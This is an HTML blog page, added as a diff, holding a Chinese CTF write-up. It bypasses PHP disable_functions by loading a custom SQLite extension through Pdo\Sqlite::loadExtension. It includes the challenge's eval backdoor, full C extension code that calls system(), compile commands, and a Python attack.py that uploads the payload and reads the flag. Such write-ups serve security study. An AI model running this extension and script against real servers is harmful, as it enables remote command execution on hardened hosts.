@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        Wblog
+    </title>
+    <meta name="description" content= 终身学习，记录成长轨迹 >
+    <meta name="keywords" content= Blog,Hexo,技术,学习,linxin >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            CTF 解题笔记：基于 PDO/Sqlite 扩展加载绕过 disable_functions
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="CTF-解题笔记：基于-PDO-Sqlite-扩展加载绕过-disable-functions"><a href="#CTF-解题笔记：基于-PDO-Sqlite-扩展加载绕过-disable-functions" class="headerlink" title="CTF 解题笔记：基于 PDO&#x2F;Sqlite 扩展加载绕过 disable_functions"></a>CTF 解题笔记：基于 PDO&#x2F;Sqlite 扩展加载绕过 disable_functions</h1><h2 id="一、-题目环境分析"><a href="#一、-题目环境分析" class="headerlink" title="一、 题目环境分析"></a>一、 题目环境分析</h2><ol>
+<li><p><strong>入口代码</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cdcas&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>这是一个简单的后门，允许我们执行任意 PHP 代码。</li>
+<li>经过测试，虽然可以使用 <code>phpinfo()</code>，但执行系统命令（如 <code>system(&quot;ls&quot;)</code>）时会提示函数被禁用或无回显，说明开启了 <code>disable_functions</code> 和可能的 <code>open_basedir</code> 限制。</li>
+</ul>
+</li>
+<li><p><strong>目标</strong>：</p>
+<ul>
+<li>在不能使用 <code>system</code>、<code>exec</code>、<code>shell_exec</code> 等函数的情况下，执行系统命令。</li>
+<li>找到并读取 Flag 文件。</li>
+</ul>
+</li>
+</ol>
+<h2 id="二、-攻击思路选择"><a href="#二、-攻击思路选择" class="headerlink" title="二、 攻击思路选择"></a>二、 攻击思路选择</h2><p>参考文档 <code>最新版 PHP 绕 open_basedir 和 disable_functions.pdf</code>，利用 PHP 的 <strong>PDO SQLite 扩展</strong>加载恶意 <code>.so</code> 文件的技术。</p>
+<ul>
+<li><strong>原理</strong>：<code>disable_functions</code> 只能禁用 PHP 解释器层面的函数。通过 <code>Pdo\Sqlite::loadExtension()</code> 加载恶意的 C 语言扩展，可以在 C 语言层面直接调用系统的 <code>system()</code> 函数，从而绕过 PHP 的限制。</li>
+</ul>
+<h2 id="三、-漏洞利用步骤"><a href="#三、-漏洞利用步骤" class="headerlink" title="三、 漏洞利用步骤"></a>三、 漏洞利用步骤</h2><h3 id="1-编写恶意-C-扩展代码-expolit-c"><a href="#1-编写恶意-C-扩展代码-expolit-c" class="headerlink" title="1. 编写恶意 C 扩展代码 (expolit.c)"></a>1. 编写恶意 C 扩展代码 (<code>expolit.c</code>)</h3><p>我们需要编写一个 SQLite 扩展，它在被加载时，读取一个包含命令的文件并执行。</p>
+<p><strong>关键代码逻辑</strong>：</p>
+<ul>
+<li>定义入口函数 <code>sqlite3_exploit_init</code>。</li>
+<li>读取 <code>/var/www/html/1.txt</code> (注意路径，详见下文) 中的命令。</li>
+<li>调用 <code>system()</code> 执行该命令。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sqlite3_exploit_init</span><span class="params">(</span></span><br><span class="line"><span class="params">  sqlite3 *db,</span></span><br><span class="line"><span class="params">  <span class="type">char</span> **pzErrMsg,</span></span><br><span class="line"><span class="params">  <span class="type">const</span> sqlite3_api_routines *pApi</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// [重要] 必须使用绝对路径或正确的相对路径</span></span><br><span class="line">  <span class="comment">// 初版尝试使用 /tmp/1.txt 失败，可能是因为 open_basedir 限制或权限问题</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *command_file_path = <span class="string">&quot;/var/www/html/1.txt&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">char</span> command_buffer[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  FILE *file_handle;</span><br><span class="line"></span><br><span class="line">  file_handle = fopen(command_file_path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (file_handle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> SQLITE_OK;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fgets(command_buffer, <span class="keyword">sizeof</span>(command_buffer), file_handle) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      command_buffer[<span class="built_in">strcspn</span>(command_buffer, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strlen</span>(command_buffer) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          system(command_buffer);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(file_handle);</span><br><span class="line">  <span class="keyword">return</span> SQLITE_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-编译-SO-文件"><a href="#2-编译-SO-文件" class="headerlink" title="2. 编译 SO 文件"></a>2. 编译 SO 文件</h3><p>由于编译器提示缺少头文件 <code>sqlite3ext.h</code>，需要先安装依赖库。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 SQLite 开发包</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install libsqlite3-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译为共享库</span></span><br><span class="line">gcc -fPIC -shared expolit.c -o exploit.so -lsqlite3</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-传输-Payload-的策略"><a href="#3-传输-Payload-的策略" class="headerlink" title="3. 传输 Payload 的策略"></a>3. 传输 Payload 的策略</h3><p>由于 <code>exploit.so</code> 是二进制文件，无法直接通过 URL 传输。采用了 <strong>Base64 编码 + PHP 写入</strong> 的方式。</p>
+<ol>
+<li>将 <code>exploit.so</code> 转为 Base64 字符串：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> -w 0 exploit.so &gt; payload.txt</span><br></pre></td></tr></table></figure></li>
+<li>由于 Base64 字符串非常长（20KB+），直接在 Burp Suite 中容易因换行符或长度限制导致 PHP <code>Parse Error</code>。</li>
+<li><strong>解决方案</strong>：编写 Python 脚本，利用 <code>requests</code> 库发送 POST 请求，确保 Base64 字符串被正确传输和还原。</li>
+</ol>
+<h3 id="4-编写攻击脚本-attack-py"><a href="#4-编写攻击脚本-attack-py" class="headerlink" title="4. 编写攻击脚本 (attack.py)"></a>4. 编写攻击脚本 (<code>attack.py</code>)</h3><p>这个脚本负责将 SO 文件和命令文件写入服务器，并触发扩展加载。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8.130.81.46:33845/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取并处理 Base64，去除换行符</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    base64_so = f.read().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 PHP Payload</span></span><br><span class="line">php_code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">$base64_so = \&quot;<span class="subst">&#123;base64_so&#125;</span>\&quot;;</span></span><br><span class="line"><span class="string">// 1. 将 SO 写入当前目录</span></span><br><span class="line"><span class="string">file_put_contents(\&quot;exploit.so\&quot;, base64_decode($base64_so));</span></span><br><span class="line"><span class="string">// 2. 将命令写入当前目录 (注意路径必须与 C 代码中一致)</span></span><br><span class="line"><span class="string">file_put_contents(\&quot;1.txt\&quot;, \&quot;cat /flag_cdcas &gt; result.txt\&quot;);</span></span><br><span class="line"><span class="string">// 3. 初始化 SQLite 并加载扩展</span></span><br><span class="line"><span class="string">$db = new Pdo\\Sqlite(&#x27;sqlite:memory:&#x27;);</span></span><br><span class="line"><span class="string">$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span></span><br><span class="line"><span class="string">$db-&gt;loadExtension(&#x27;exploit.so&#x27;);</span></span><br><span class="line"><span class="string">// 4. 读取执行结果</span></span><br><span class="line"><span class="string">echo file_get_contents(\&quot;result.txt\&quot;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=&#123;<span class="string">&quot;cdcas&quot;</span>: php_code&#125;)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、-遇到的坑与排查"><a href="#四、-遇到的坑与排查" class="headerlink" title="四、 遇到的坑与排查"></a>四、 遇到的坑与排查</h2><ol>
+<li><p><strong>文件路径陷阱</strong>：</p>
+<ul>
+<li><strong>现象</strong>：报错 <code>No such file or directory</code> 或无回显。</li>
+<li><strong>原因</strong>：C 代码中硬编码了 <code>/tmp/1.txt</code>，但环境可能对 <code>/tmp</code> 有写入限制或权限隔离。</li>
+<li><strong>解决</strong>：改用 Web 根目录 <code>/var/www/html/</code>（当前目录 <code>./</code>），这是必定可写的路径。同时修改 C 代码并重新编译。</li>
+</ul>
+</li>
+<li><p><strong>PHP 语法错误</strong>：</p>
+<ul>
+<li><strong>现象</strong>：<code>Parse error: syntax error, unexpected end of file</code>。</li>
+<li><strong>原因</strong>：Base64 字符串中包含了换行符，导致 PHP 认为字符串提前结束。</li>
+<li><strong>解决</strong>：使用 Python 脚本生成 Payload，避免手动粘贴。</li>
+</ul>
+</li>
+<li><p><strong>Flag 路径未知</strong>：</p>
+<ul>
+<li><strong>现象</strong>：执行 <code>cat /flag</code> 无回显。</li>
+<li><strong>原因</strong>：Flag 文件不在 <code>/flag</code>，而是重命名了。</li>
+<li><strong>解决</strong>：修改脚本中的命令为 <code>ls -la /</code>，发现根目录下有一个名为 <code>flag_cdcas</code> 的文件。随后修改命令为 <code>cat /flag_cdcas</code>。</li>
+</ul>
+</li>
+</ol>
+<h2 id="五、-最终执行与获取-Flag"><a href="#五、-最终执行与获取-Flag" class="headerlink" title="五、 最终执行与获取 Flag"></a>五、 最终执行与获取 Flag</h2><ol>
+<li>修改 <code>attack.py</code> 中的命令为 <code>ls -la /</code>，发现目标文件。</li>
+<li>再次修改为 <code>cat /flag_cdcas &gt; result.txt</code>。</li>
+<li>运行脚本，成功获得回显。</li>
+</ol>
+<p><strong>Flag:</strong> <code>flag&#123;hello_world_935a00069646&#125;</code></p>
+<h2 id="六、-总结"><a href="#六、-总结" class="headerlink" title="六、 总结"></a>六、 总结</h2><p>本题考察的核心技术点是 <strong>利用 PHP 扩展机制绕过 disable_functions</strong>。<br>通过编写 C 语言扩展，利用 <code>Pdo\Sqlite::loadExtension</code> 在进程空间内直接执行系统命令。难点在于二进制文件的传输（Base64处理）以及服务器文件路径的探测与适配。</p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 linxin | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
